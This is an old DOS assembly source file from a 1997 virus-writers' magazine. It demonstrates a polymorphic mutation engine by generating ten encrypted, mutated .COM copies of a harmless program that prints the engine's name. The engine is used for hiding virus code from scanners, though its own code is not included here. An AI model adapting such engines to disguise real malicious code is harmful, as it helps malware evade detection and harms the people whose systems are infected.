;
;      ‹‹                  €
;     ﬂﬂﬂ  Virus Magazine  € Box 176, Kiev 210, Ukraine      IV  1997
;     ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ  €ﬂﬂﬂﬂﬂﬂ€
;      ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€    › € ‹ﬂ€ € ‹ﬂﬂ €‹‹   € ﬂﬂﬂ€ €
;       € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €    € € € € € €   €     € ‹‹‹€ €
;       € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ     ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹  € €‹‹‹ €
;       ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  €‹‹‹‹‹‹€
;          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
;                              sgww@hotmail.com
;            Digest of IV 8 - 11 russian, including Moscow issues

        .model  tiny
        .code
        extrn   Emme11: near
        public  SaveOff
        public  CrLen
        ORG     100h

;-----------------------------------------------------
;   This programm was not written by myself.
;   It's code was stolen from PME demonstration
;   but the MUTATION ENGINE is mine.
;
;                                  Eternal Maverick
;-----------------------------------------------------

BEGIN:
        MOV     DX,OFFSET GEN_MSG
        MOV     AH,9
        INT     21H

        MOV     CX,10
GENFILE:
        PUSH    CX

        MOV     DX,OFFSET FILENAME
        PUSH    CS
        POP     DS
        XOR     CX,CX
        MOV     AH,3CH
        INT     21H

        PUSH    AX

        STR       EQU OFFSET PROG
        SaveOff   EQU OFFSET FileOff

        PUSH    CS
        POP     DS

        PUSH    SS
        POP     AX
        ADD     AX,1000h
        MOV     ES,AX                ; es - buffer segment

        MOV     SI,OFFSET PROG       ; si - an offset of code to encrypt

        CALL    Emme11

        POP     BX
        PUSH    ES
        POP     DS
        XOR     DX,DX
        MOV     CX,DI
        MOV     AH,40H
        INT     21H

        MOV     AH,3EH
        INT     21H

        MOV     BX,OFFSET FILENAME
        INC     BYTE PTR CS:[BX+2]

        POP     CX
        LOOP    GENFILE

        INT     20H

FILENAME DB     '000.COM',0

GEN_MSG DB      'Generating 10 encrypted programs...$',0dh

FileOff    DW   100h
CrLen      DW   (OFFSET END_PROG - PROG + 1)/2

PROG:
        CALL    SIGN_OFF
MSG     DB      'Eternal Maverick Mutation Engine',0ah,0dh
        DB      'Small Edition 1.5','$'
SIGN_OFF:
        POP     DX
        MOV     AH,9
        INT     21h
        INT     20h
end_prog:
        end begin